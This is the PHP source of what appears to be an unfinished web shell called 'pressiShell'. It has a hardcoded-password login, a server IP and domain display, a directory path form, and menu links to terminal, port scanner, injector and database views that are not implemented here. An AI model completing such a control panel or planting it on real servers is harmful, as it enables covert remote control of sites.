<?php 
/*login section */
session_start();
if(isset($_POST['submit'])){
	if($_POST['password']=='pass'){
		$_SESSION['password']=$_POST['password'];
		header("Location: ?");
	}
	else{
	  header("Location: ?");
        }
}
/* log section */
if (isset($_GET['action']) AND $_GET['action'] == 'logout') {
	session_destroy();
	header("Location: ?");
	die();
}

/* -------------------adding info----------------- 
*calculating the memory of the disk */
 function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' bytes';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' byte';
        }
        else
        {
            $bytes = '0 bytes';
        }

        return $bytes;
}

/*----------------------------------*/
if ($_SERVER['REQUEST_METHOD'] == 'POST' AND isset($_POST['qpath'])) {
	header("Location: ?cd=" . base64_encode($_POST['qpath']));
}

?>

<html>
<head>
	<title>Tamilan infotech v0.1</title>
	<meta charset="utf-8">
    <link rel="stylesheet" href="main.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <!-- login form [login into]  -->
    <?php   if(!isset($_SESSION['password'])) {?>
	<form action="" method="post" id="login">
		<p>PASSWORD</p><br />
		<input type="password" name="password" auotcomplete="off" spellcheck="false" autofocus /><br />
	<input type="submit" name="submit" value="GET IN!" >
    </form>
    <?php die(); } ?>

    <!-- header part -->
    <header class="header_box">
    	  <div class="logo">
          <h1>pressiShell </h1>
    	</div>
    	<div class="info">
		  <p>Server IP: <span class="showing_different"><?php echo gethostbyname($_SERVER['SERVER_NAME']) ?></span><p>
		  <p>Server Domain name: <span class="showing_different"><?php echo $_SERVER['SERVER_NAME'] ?></span><p>
	    </div>
	<nav >
	   <ul>
		  <li><a href="?">explorer</a></li>
		  <li><a href="?view=evaluate">evaluate</a></li>
		  <li><a href="?view=info">info</a></li>
		  <li><a href="?view=terminal">terminal</a></li>
		  <li><a href="?view=port_scanner">port scanner</a></li>
		  <li><a href="?view=injector">injector</a></li>
		  <li><a href="?view=database">database</a></li>
		  <li><a href="?view=networking">networking</a></li>
		  <li><a href="?action=logout"><i class="fa fa-sign-out"></i> logout</a></li>
	    </ul>
      </nav>
   </header>
    <!-- dir path -->
   	<form action="" method="POST" id="path">
		<input value="<?php echo getcwd(); ?>" name="qpath" spellcheck="false" autocomplete="off" />
	</form>
   
    
   <!-- info part-->
  <!-- <?php if(isset($_GET['view']) AND $_GET['view'] == 'info'){?>
   <div class="info_server">
   <table class="arrange">
   	<tr>
   		<td>ROOT_DISK</td>

   	</tr>

   </table>
   </div>
   <?php }?>
-->

</body>
</html>